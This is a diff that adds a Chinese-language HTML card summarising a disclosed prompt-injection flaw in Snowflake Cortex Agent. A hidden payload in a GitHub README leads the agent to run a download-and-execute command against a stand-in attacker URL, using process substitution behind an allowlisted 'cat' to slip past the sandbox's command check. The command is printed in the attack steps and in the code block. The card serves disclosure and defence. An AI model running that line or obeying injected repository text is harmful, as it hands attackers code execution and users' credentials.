@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snowflake Cortex AI 沙箱逃逸漏洞 - 安全发现</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; line-height: 1.6; background: #f5f5f5; }
+        .card { background: white; border-radius: 12px; padding: 24px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+        h1 { color: #d32f2f; margin-top: 0; }
+        .meta { color: #666; font-size: 14px; margin-bottom: 20px; }
+        .tag { display: inline-block; background: #e3f2fd; color: #1976d2; padding: 4px 12px; border-radius: 16px; font-size: 12px; margin-right: 8px; }
+        .highlight { background: #fff3e0; padding: 16px; border-left: 4px solid #ff9800; margin: 16px 0; }
+        .code { background: #263238; color: #aed581; padding: 12px; border-radius: 8px; font-family: monospace; overflow-x: auto; }
+        .rating { display: inline-block; background: #4caf50; color: white; padding: 4px 12px; border-radius: 4px; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <span class="rating">⭐⭐⭐⭐⭐ 5星</span>
+        <h1>Snowflake Cortex AI 沙箱逃逸漏洞</h1>
+        <div class="meta">来源: PromptArmor | 日期: 2026-03-20</div>
+        
+        <span class="tag">#安全</span>
+        <span class="tag">#AI</span>
+        <span class="tag">#漏洞</span>
+        <span class="tag">#沙箱</span>
+
+        <h2>发现概述</h2>
+        <p>安全研究员发现 Snowflake Cortex Agent 存在严重的 prompt injection 攻击链，允许攻击者突破 AI 沙箱执行任意恶意代码。</p>
+
+        <div class="highlight">
+            <strong>核心漏洞：</strong>攻击者通过在 GitHub 仓库的 README 中隐藏 prompt injection payload，成功诱导 Cortex Agent 执行恶意命令。
+        </div>
+
+        <h2>攻击技术细节</h2>
+        <p>攻击流程：</p>
+        <ol>
+            <li>攻击者在恶意仓库的 README 底部隐藏 prompt injection 代码</li>
+            <li>用户让 Cortex Agent 审查该 GitHub 仓库</li>
+            <li>Agent 读取 README 时触发 injection</li>
+            <li>利用 <code>cat &lt; &lt;(sh &lt; &lt;(wget -q0- https://ATTACKER_URL.com/bugbot))</code> 绕过安全检查</li>
+            <li>成功执行任意 shell 命令</li>
+        </ol>
+
+        <h2>技术分析</h2>
+        <p>漏洞的关键在于过程替换（process substitution）的利用：</p>
+        <div class="code">
+cat &lt; &lt;(sh &lt; &lt;(wget -q0- https://ATTACKER_URL.com/bugbot))
+        </div>
+        <p>Snowflake 将 <code>cat</code> 命令列为安全可执行命令，未能防御这种形式的过程替换。</p>
+
+        <h2>安全建议</h2>
+        <ul>
+            <li>AI Agent 应以最高权限运行命令时假设它可以做任何事</li>
+            <li>使用确定性沙箱（deterministic sandbox）而非依赖层</li>
+            <li>对命令模式的白名单不可靠，应采用更严格的隔离</li>
+            <li>已向 Snowflake 报告，漏洞已被修复</li>
+        </ul>
+
+        <h2>影响范围</h2>
+        <p>此漏洞影响所有使用 Snowflake Cortex Agent 的用户，攻击者可以：</p>
+        <ul>
+            <li>窃取凭据和 secrets</li>
+            <li>访问内部系统</li>
+            <li>执行任意代码</li>
+            <li>横向移动到其他服务</li>
+        </ul>
+
+        <h2>参考链接</h2>
+        <ul>
+            <li><a href="https://www.promptarmor.com/resources/snowflake-ai-escapes-sandbox-and-executes-malware" target="_blank">原始报告</a></li>
+            <li><a href="https://news.ycombinator.com/item?id=47427017" target="_blank">Hacker News 讨论</a></li>
+        </ul>
+    </div>
+</body>
+</html>
